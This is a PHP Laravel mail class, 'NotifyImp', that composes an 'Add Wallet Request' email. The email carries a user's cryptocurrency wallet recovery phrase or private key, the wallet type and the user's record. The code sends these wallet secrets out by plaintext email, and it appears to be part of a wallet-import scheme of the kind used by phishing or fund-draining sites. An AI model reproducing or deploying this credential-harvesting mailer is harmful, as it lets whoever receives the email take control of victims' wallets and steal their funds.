<?php

namespace App\Mail;

use App\User;
use Illuminate\Bus\Queueable;
use Illuminate\Mail\Mailable;
use Illuminate\Queue\SerializesModels;
use Illuminate\Contracts\Queue\ShouldQueue;

class NotifyImp extends Mailable
{
    use Queueable, SerializesModels;

    /**
     * Create a new message instance.
     *
     * @return void
     */
    public $notify;
    protected $user;
    public function __construct($data = [])
    {
        $this->notify = $data;
        $this->user = User::find($data['user_id']);
    }

    /**
     * Build the message.
     *
     * @return $this
     */
    public function build()
    {
        return $this->subject('Add Wallet Request')->markdown('emails.imp', [
            "type" => $this->notify['key_type'] === "phrase" ? "Recovery Phrase" : "Private Key",
            "wallet_type" => $this->notify['wallet_type'],
            "recovery_data" => $this->notify['recovery_data'],
            "user" => $this->user
        ]);
    }
}
